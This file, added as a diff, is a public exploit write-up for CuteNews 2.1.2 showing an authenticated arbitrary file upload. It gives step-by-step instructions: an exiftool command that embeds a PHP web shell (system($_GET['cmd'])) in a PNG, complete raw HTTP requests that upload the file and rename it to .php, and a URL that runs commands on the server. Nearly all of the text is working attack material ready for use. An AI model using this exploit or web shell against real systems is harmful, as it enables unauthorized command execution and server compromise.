@@ -1,0 +1,117 @@
+# Exploit Title: CuteNews 2.1.2 - Authenticated Arbitrary File Upload
+# Date: 2020-05-12
+# Author: Vigov5 - SunCSR Team
+# Vendor Homepage: https://cutephp.com
+# Software Link: https://cutephp.com/click.php?cutenews_latest
+# Version: v2.1.2
+# Tested on: Ubuntu 18.04 / Kali Linux
+
+Description:
+------------------------------------------------------------------------
+In the "Media Manager" area, Users with low privileges (Editor) can bypass
+file upload restrictions, resulting in arbitrary command execution.
+
+
+[PoC]
+--------------------------------------------------------------------------------
+
+# Step 1. Create shell  $ exiftool -Comment='<?php echo "<pre>";
+system($_GET['cmd']); ?>' shell.png;
+# Step 2. Upload Shell (# Minimum editor privileges)
+
+POST /CuteNews/index.php HTTP/1.1
+Host: [target]
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101
+Firefox/76.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;
+boundary=---------------------------15868731501112834542363527723
+Content-Length: 3775
+Origin: [target]
+DNT: 1
+Connection: close
+Referer: [target]/CuteNews/index.php
+Cookie: CUTENEWS_SESSION=k4rgekaj68tr9ln8j0jlme7e7h
+Upgrade-Insecure-Requests: 1
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="mod"
+
+media
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="opt"
+
+media
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="folder"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="CKEditorFuncNum"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="callback"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="style"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="faddm"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="imgopts"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="__signature_key"
+
+7ffa4c94a150c20f0c1b51036f6e4597-editor
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="__signature_dsi"
+
+48d87ded04d15407f258c57efa3216e8
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="upload_from_inet"
+
+
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="upload_file[]"; filename="shell.png"
+Content-Type: image/png
+
+[Content Image Here ! ]
+-----------------------------15868731501112834542363527723
+Content-Disposition: form-data; name="upload"
+
+Upload file(s)
+-----------------------------15868731501112834542363527723--
+
+# Step 3. Change filename shell.jpg to shell.php
+
+POST /CuteNews/index.php HTTP/1.1
+Host: [target]
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101
+Firefox/76.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 241
+Origin: [target]
+DNT: 1
+Connection: close
+Referer: http://[target]CuteNews/index.php
+Cookie: CUTENEWS_SESSION=k4rgekaj68tr9ln8j0jlme7e7h
+Upgrade-Insecure-Requests: 1
+
+mod=media&opt=media&folder=&CKEditorFuncNum=&callback=&style=&faddm=&imgopts=&__signature_key=ebdaf403dcda492fabe8f1d96399b16b-editor&__signature_dsi=27a9035f2b130dd1477ad2a37a5721da&pending=rename&ids%5B0%5D=shell.png&place%5B0%5D=shell.php
+
+# Step 4. Execute the command with the path : http://
+[target]/CuteNews/uploads/shell.php?cmd=id
